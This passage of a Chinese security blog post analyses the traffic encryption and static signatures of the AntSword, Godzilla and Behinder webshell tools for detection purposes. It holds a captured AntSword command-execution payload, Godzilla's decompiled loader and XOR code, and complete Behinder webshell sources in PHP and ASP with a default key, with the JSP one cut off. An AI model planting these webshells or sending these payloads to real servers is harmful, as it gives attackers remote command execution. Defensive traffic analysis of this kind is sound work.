class="string">&#x27;system&#x27;</span>))&#123;@<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>))&#123;@<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>));&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>))&#123;@<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;</span></span><br><span class="line"><span class="string">    &quot;</span>,<span class="variable">$o</span>));&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>))&#123;<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>,<span class="number">2048</span>));&#125;@<span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span></span><br><span class="line">    = @<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)),</span><br><span class="line">    <span class="variable">$io</span>);<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));&#125;<span class="keyword">while</span>(!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;<span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));&#125;@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">1</span>]);@<span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">2</span>]);@<span class="title function_ invoke__">proc_close</span>(<span class="variable">$p</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">runshellshock</span>(<span class="variable">$d</span>,</span><br><span class="line">    <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @<span class="title function_ invoke__">class_exists</span>(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">new</span></span><br><span class="line">    <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdOut</span>();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdErr</span>();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;<span class="title function_ invoke__">ReadAll</span>();<span class="keyword">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span></span><br><span class="line">    = <span class="number">127</span>;&#125;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;<span class="variable">$ret</span>=@<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);<span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span></span><br><span class="line">    <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();&#125;;<span class="title function_ invoke__">asoutput</span>();<span class="keyword">die</span>();&amp;ve0a018006ce77=<span class="number">6</span>cL2Jpbi9zaA==&amp;yf44c9b536f58a=Ec</span><br></pre></td></tr></table></figure>
+
+<p>从数据包中可以看出传入了e054ebfc9bb446参数，并传入一段base64过的内容，并从内容中截取第三个字符开始进行解码，可以看到里面正是有一个pwd命令，并在最后输出了一个ea331字符串，以前的蚁剑是一个jasmine参数是代表密码，现在是直接显示密码参数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021808284.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312021808284.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<h2 id="0x02哥斯拉"><a href="#0x02哥斯拉" class="headerlink" title="0x02哥斯拉"></a>0x02哥斯拉</h2><p>哥斯拉也是渗透中较为常见的webshell工具，由java语言编写的，生成的shell能绕过大部分查杀工具的静态查杀，流量加密部分也是可以绕过大部分流量监控waf。内涵的插件功能也是十分强大，除去基本的代码执行、文件操作，还有系统提权、msf联动、绕过disable_function、内存加载等等</p>
+<p>本次使用的版本为4.0，工具地址为<a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla/releases">https://github.com/BeichenDream/Godzilla/releases</a></p>
+<p>本次操作以PHP木马为例</p>
+<p>刚开始使用抓包的时候如果没及时放包会提示initShellOpertion()报错，猜测应该是程序开始执行时先走这个方法，之后去看了下资料无误，随后也是跟网上一些思路反编译研究哥斯拉，直接搜索这个方法，可以看到在core&#x2F;shell&#x2F;shellentity.java下有这个方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312022056017.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312022056017.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>使用一句话php，抓包可以看到哥斯拉会发送三个数据包，其中包含的参数有密码pass，密钥key，还有扰乱数据，流程为先将密码和密钥拼接，获取到MD5，之后截取前16位，之后拼接恶意数据，最后还会截取MD5的后16位拼接，再使用url编码，最后还进行了一次base64编码。细心地还可以发现在返回包里会有set-cookie：PHPSESSID，因为这个木马是php的，还有一个Expires参数是一直不变的，和Cache-Control: no-store, no-cache, must-revalidate，这也是其中特征</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">generateEvalContent</span>() &#123;</span><br><span class="line">		String <span class="keyword">eval</span> = (<span class="keyword">new</span> <span class="title class_">String</span>(Generate.<span class="title function_ invoke__">GenerateShellLoder</span>(this.shell.<span class="title function_ invoke__">getSecretKey</span>(), 					functions.<span class="title function_ invoke__">md5</span>(this.shell.<span class="title function_ invoke__">getSecretKey</span>()).<span class="title function_ invoke__">substring</span>(<span class="number">0</span>, <span class="number">16</span>), <span class="literal">false</span>))).<span class="title function_ invoke__">replace</span>(<span class="string">&quot;&lt;?php&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line">		<span class="keyword">eval</span> = functions.<span class="title function_ invoke__">base64EncodeToString</span>(<span class="keyword">eval</span>.<span class="title function_ invoke__">getBytes</span>());</span><br><span class="line">		<span class="keyword">eval</span> = (<span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="keyword">eval</span>)).<span class="title function_ invoke__">reverse</span>().<span class="title function_ invoke__">toString</span>();</span><br><span class="line">		<span class="keyword">eval</span> = String.<span class="title function_ invoke__">format</span>(<span class="string">&quot;eval(base64_decode(strrev(urldecode(&#x27;%s&#x27;))));&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; URLEncoder.<span class="title function_ invoke__">encode</span>(<span class="keyword">eval</span>) &#125;);</span><br><span class="line">		<span class="keyword">eval</span> = URLEncoder.<span class="title function_ invoke__">encode</span>(<span class="keyword">eval</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">eval</span>;</span><br><span class="line">&#125;<span class="comment">//加密流程</span></span><br></pre></td></tr></table></figure>
+
+<p>第一个数据包，可以看到pass参数就是设置php马时设置的密码，里面已经有entity类的属性，包括密码，url，代理，密钥等信息，直接向shell发起请求，使用的是generateEvalContent函数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312022108527.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312022108527.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title function_ invoke__">test</span>() &#123;</span><br><span class="line">		ReqParameter parameter = <span class="keyword">new</span> <span class="title class_">ReqParameter</span>();</span><br><span class="line">		byte[] result = <span class="title function_ invoke__">evalFunc</span>(<span class="literal">null</span>, <span class="string">&quot;test&quot;</span>, parameter);</span><br><span class="line">		String codeString = <span class="keyword">new</span> <span class="title class_">String</span>(result);</span><br><span class="line">		<span class="keyword">if</span> (codeString.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">equals</span>(<span class="string">&quot;ok&quot;</span>)) &#123;</span><br><span class="line">				this.isAlive = <span class="literal">true</span>;</span><br><span class="line">				<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		Log.<span class="title function_ invoke__">error</span>(codeString);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二个数据包和第三个数据包一样，在代码中使用的是test函数用来测试与服务器的连接状态，将服务器返回结果去空格后对比等于ok就代表连接成功了。里面有个evalFunc函数，跟进函数(shells&#x2F;payloads&#x2F;php&#x2F;PhpShell.java)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> byte[] <span class="title function_ invoke__">evalFunc</span>(String className, String funcName, ReqParameter parameter) &#123;</span><br><span class="line">		<span class="title function_ invoke__">fillParameter</span>(className, funcName, parameter);</span><br><span class="line">		byte[] data = parameter.<span class="title function_ invoke__">formatEx</span>();</span><br><span class="line">		<span class="keyword">if</span> (this.gzipDecodeMagic == <span class="number">1</span>) &#123;</span><br><span class="line">				data = functions.<span class="title function_ invoke__">gzipE</span>(data);</span><br><span class="line">		&#125; </span><br><span class="line">		byte[] result = this.http.<span class="title function_ invoke__">sendHttpResponse</span>(data).<span class="title function_ invoke__">getResult</span>();</span><br><span class="line">		<span class="keyword">if</span> ((this.gzipEncodeMagic == -<span class="number">1</span> || this.gzipEncodeMagic == <span class="number">1</span>) &amp;&amp; functions.<span class="title function_ invoke__">isGzipStream</span>(result)) &#123;</span><br><span class="line">		result = functions.<span class="title function_ invoke__">gzipD</span>(result);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>里面通过sendHttpResponse发送第二、三个数据包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312022108125.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312022108125.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>第三个数据包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312022109358.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312022109358.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>加密函数(shells&#x2F;cryptions&#x2F;phpXor&#x2F;PhpEvalXor.java)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> byte[] <span class="title function_ invoke__">encode</span>(byte[] data) &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="title function_ invoke__">E</span>(data);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> e) &#123;</span><br><span class="line">			Log.<span class="title function_ invoke__">error</span>(e);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> byte[] <span class="title function_ invoke__">E</span>(byte[] cs) &#123;</span><br><span class="line">		<span class="keyword">int</span> len = cs.length;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">				cs[i] = (byte)(cs[i] ^ this.key[i + <span class="number">1</span> &amp; <span class="number">0xF</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> (String.<span class="title function_ invoke__">format</span>(<span class="string">&quot;%s=%s&amp;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; this.pass, this.evalContent &#125;) + this.shell.<span class="title function_ invoke__">getSecretKey</span>() + <span class="string">&quot;=&quot;</span> + URLEncoder.<span class="title function_ invoke__">encode</span>(functions.<span class="title function_ invoke__">base64EncodeToString</span>(cs))).<span class="title function_ invoke__">getBytes</span>();</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//evalContent的内容是：</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_ invoke__">generateEvalContent</span>() &#123;</span><br><span class="line">		String <span class="keyword">eval</span> = (<span class="keyword">new</span> <span class="title class_">String</span>(Generate.<span class="title function_ invoke__">GenerateShellLoder</span>(this.shell.<span class="title function_ invoke__">getSecretKey</span>(), functions.<span class="title function_ invoke__">md5</span>(this.shell.<span class="title function_ invoke__">getSecretKey</span>()).<span class="title function_ invoke__">substring</span>(<span class="number">0</span>, <span class="number">16</span>), <span class="literal">false</span>))).<span class="title function_ invoke__">replace</span>(<span class="string">&quot;&lt;?php&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">		<span class="keyword">eval</span> = functions.<span class="title function_ invoke__">base64EncodeToString</span>(<span class="keyword">eval</span>.<span class="title function_ invoke__">getBytes</span>());</span><br><span class="line">		<span class="keyword">eval</span> = (<span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="keyword">eval</span>)).<span class="title function_ invoke__">reverse</span>().<span class="title function_ invoke__">toString</span>();</span><br><span class="line">		<span class="keyword">eval</span> = String.<span class="title function_ invoke__">format</span>(<span class="string">&quot;eval(base64_decode(strrev(urldecode(&#x27;%s&#x27;))));&quot;</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; URLEncoder.<span class="title function_ invoke__">encode</span>(<span class="keyword">eval</span>) &#125;);</span><br><span class="line">		<span class="keyword">eval</span> = URLEncoder.<span class="title function_ invoke__">encode</span>(<span class="keyword">eval</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">eval</span>;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最终发送的数据包是拼接的，内容是：password密码&#x3D;evalContent + 密钥key + &#x3D; + 对要发送的数据先base64编码，再进行异或运算，再url编码</p>
+<p>最终流程</p>
+<p>计算出 md5 (pass + key), 对响应包截取该md5后的前16位以及后16位   sub(md5(pass+key) ,0,16) + payload + sub(md5(pass+key),16,32)<br>对截取后的响应包内容进行 base64解码 + aes解密 + gzip解压缩</p>
+<h2 id="0x03冰蝎"><a href="#0x03冰蝎" class="headerlink" title="0x03冰蝎"></a>0x03冰蝎</h2><p>冰蝎是个动态二进制webshell客户端，常用于APT攻防，历史版本中有多个版本，如v2.0、v3.0、v4.0，里面有注入内存马、反弹shell、自定义代码功能，工具地址为<a target="_blank" rel="noopener" href="https://github.com/rebeyond/Behinder">https://github.com/rebeyond/Behinder</a></p>
+<p>冰蝎4.0需要高版本jdk环境，还需要javafx库，java11以上移除了需要另外安装，库的地址<a target="_blank" rel="noopener" href="https://openjfx.cn/dl/">https://openjfx.cn/dl/</a></p>
+<p>本次使用的是PHP木马</p>
+<p>引用作者一个图可以清晰看到冰蝎的整个流程（2.0&amp;3.0）</p>
+<p>注！！：没太了解这个，查了好几篇文章都是，其实这是个冰蝎2.0&amp;3.0的流程图，但文章大多数标题都写4.0，后面才恍然大悟</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031134679.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031134679.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>可以看到与webshell连接时首先发起请求去获取密钥，而在webshell里会生成一个随机密钥，并写入session。</p>
+<p>冰蝎4.0没有了输入密码的概念，而是直接将payload进行传输协议的加密后发送给服务端，这里也是变相向服务端确定这边可以连接到服务器，之后服务器就会解密payload，去命令执行，之后用同样的方式加密返回给本地，自定义传输协议算法就是所谓的<strong>密码</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031631019.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031631019.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>从连接shell到结束一共有2个数据包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031535568.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031535568.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031535805.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031535805.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>使用ls命令抓到的数据包</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031538041.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031538041.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>可以从冰蝎传输协议功能看到，我用的是xor_base64加密，这里就是整段数据包加密处理的模块，里面用对数据包与key偏移做了一个异或操作。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031554081.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031554081.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>整理下代码可以发现有一个cmd变量</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031555279.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031555279.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p>把cmd变量中的值放到base64解码，得到刚才的ls</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031553970.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/wh1t3zer/recordCTF/imgs/202312031553970.png" srcset="https://img2.baidu.com/it/u=2037979560,2772131037&fm=26&fmt=auto&gp=0.jpg"></p>
+<p><strong>冰蝎3.0和4.0有什么区别</strong></p>
+<p>1、3.0是使用连接密码，向服务端发起请求获取密钥并添加到session中，而4.0则是引入全新的“传输协议”，本质上就是连接密码，不过是把密码“去中心化”</p>
+<p>2、3.0建立通信时使用的是明文传输，4.0直接使用了传输协议加密后向服务器发起请求</p>
+<p>3、4.0加入了更多的加密方式，而3.0以下均使用AES-128</p>
+<h2 id="0x04对比"><a href="#0x04对比" class="headerlink" title="0x04对比"></a>0x04对比</h2><h3 id="静态特征"><a href="#静态特征" class="headerlink" title="静态特征"></a>静态特征</h3><h4 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h4><p>1、php中使用assert、eval等命令执行</p>
+<p>2、asp使用的eval命令执行</p>
+<p>3、jsp使用的是Java类加载（ClassLoader），同时会带有base64编码解码等字符特征</p>
+<p>4、蚁剑的混淆加密会存在0x…开头的参数名，也可以作为特征</p>
+<h4 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h4><p>1、选择默认脚本编码生成的情况下，jsp会出现xc，pass字符和java反射（ClassLoader，GetClass().getClassLoader()）,base64加解码</p>
+<p>2、php和asp都是一句话木马</p>
+<h4 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h4><p>1、在PHP中会判断是否开启openssl采用不同的加密算法，在代码中同样会存在eval，assert等字符特征</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">	<span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="comment">//该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond     				</span></span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;     </span><br><span class="line">	<span class="title function_ invoke__">session_write_close</span>();     </span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);     </span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))&#123; </span><br><span class="line">    <span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">    <span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);                  </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;                  </span><br><span class="line">      <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];                  </span><br><span class="line">    &#125;     </span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;         </span><br><span class="line">    <span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);     </span><br><span class="line">  &#125;     </span><br><span class="line">	<span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);     </span><br><span class="line">	<span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];     </span><br><span class="line">	<span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];     </span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;     </span><br><span class="line">	@<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>2、在asp中会在for循环进行一段异或处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Response.CharSet = &quot;UTF-8&quot;  k=&quot;e45e329feb5d925b&quot; </span><br><span class="line">  Session(&quot;k&quot;)=k size=Request.TotalBytes content=Request.BinaryRead(size) For i=1 To size result=result&amp;Chr(ascb(midb(content,i,1)) Xor Asc(Mid(k,(i and 15)+1,1))) Next execute(result) </span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>3、在jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%!<span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;     </span><br><span class="line">  U(ClassLoader c) &#123;         </span><br><span class="line">    <span class="built_in">super</span>(c);     </span><br><span class="line">  &#125;     </span><br><span class="line">  <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span> &#123;         </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);     </span><br><span class="line">  &#125; </span><br><span class="line">&#125; </span><br><span class="line">%&gt;</span><br><span class="line">&lt;%<span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>)) &#123;     </span><br><span class="line">  String k=<span class="string">&quot;e45e329feb5d925b&quot;</span>;     <span class="comment">/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/</span>     session.putValue(<span class="string">&quot;u&quot;</span>,k);     </span><br><span class="line">  Cipher 